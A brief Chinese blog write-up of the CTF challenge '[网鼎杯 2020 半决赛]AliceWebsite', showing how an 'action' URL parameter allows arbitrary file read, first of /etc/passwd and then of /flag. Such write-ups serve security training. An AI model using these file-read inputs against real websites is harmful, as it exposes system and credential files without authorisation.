---
title: '[网鼎杯 2020 半决赛]AliceWebsite'
date: 2024-06-20 16:40:06
tags: 题解
categories: 刷题笔记
---

### [网鼎杯 2020 半决赛]AliceWebsite（任意文件读取）

打开页面，我们在url里发现一个

```
?action=home.php
```

![image-20240620190834127](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406201908247.png)

我们猜测为任意文件读取，我们输入

<!--more-->

```
/etc/passwd
```

![image-20240620191039316](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406201910442.png)

有输出，我们直接读取flag

```
?action=/flag
```

![image-20240620191106338](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406201911391.png)
